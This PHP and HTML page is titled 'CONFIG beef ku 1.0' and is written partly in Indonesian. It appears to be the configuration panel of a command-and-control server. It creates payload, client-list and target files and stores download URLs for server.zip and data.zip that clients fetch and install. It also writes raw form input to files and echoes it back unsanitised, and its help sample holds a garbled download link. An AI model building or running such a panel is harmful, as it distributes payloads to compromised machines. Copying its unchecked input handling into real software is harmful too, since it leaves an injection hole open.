 <html>

 <head>
    <title>CONFIG beef ku 1.0</title>
    <!--[if IE]><script type="text/javascript" src="excanvas.js"></script><![endif]-->
  </head>
<form action="" method="post">  

 url server.zip : <input type="text" name="edt_install_server"><br>
 url data.zip : <input type="text" name="edt_install_data">
 <input type="submit" name="enter_install" value="Enter"><br>
</form>

</html>

<?php

if (is_dir("payloadout") != 1) {
    mkdir("payloadout");
}
if (is_dir("listclient") != 1) {
    mkdir("listclient");
}
if (!file_exists("inpayload.txt")) {
    $file = fopen("inpayload.txt", "w");
    fwrite($file, "null");
    fclose($file);
}
if (!file_exists("baleni.txt")) {
    $file = fopen("baleni.txt", "w");
    fwrite($file, "kosong");
    fclose($file);
}
if (!file_exists("outpayload.txt")) {
    $file = fopen("outpayload.txt", "w");
    fwrite($file, "null");
    fclose($file);
}
if (!file_exists("target.txt")) {
    $file = fopen("target.txt", "w");
    fwrite($file, "null");
    fclose($file);
}

if (!file_exists("ping.txt")) {
    $file = fopen("ping.txt", "w");
    fwrite($file, "1");
    fclose($file);
}

if (!file_exists("swthread.txt")) {
    $file = fopen("swthread.txt", "w");
    fwrite($file, "mati");
    fclose($file);
}


if (!file_exists("install.txt")) {
	echo "<script>alert('data [install.txt] kosong secepatnya diisi');</script>";
}

if (isset($_POST['enter_install'])) {
	$data_server = $_POST['edt_install_server'];
	$data_data = $_POST['edt_install_data'];

	$data = ["url_install_server" => $data_server,
			 "url_install_data" => $data_data];
	
	$file = fopen("install.txt","w");
	fwrite($file, json_encode($data));
	fclose($file);
}


if(isset($_POST['enter']))  
{
	$data = $_POST['edt'];
	$file = fopen("update.txt","w");
	fwrite($file, $data);
	fclose($file);

	if ($data == "bantuan") {
		echo "sample install data <font color='blue'>server.zipshunpchttps://google.drive.HGLkhHgjhshunpc </font>";
	}else {
		header("Location: /client.php");
	}
}


echo "<br><h1>[ PING ] </H1><br>";
$myfile = fopen("ping.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("ping.txt"));
fclose($myfile);
echo "<br><h1>[ PING ] </H1>";


echo "<br><h1>[ INSTALL ] </H1><br>";
$myfile = fopen("install.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("install.txt"));
fclose($myfile);
echo "<br><h1>[ INSTALL ] </H1>";


?>
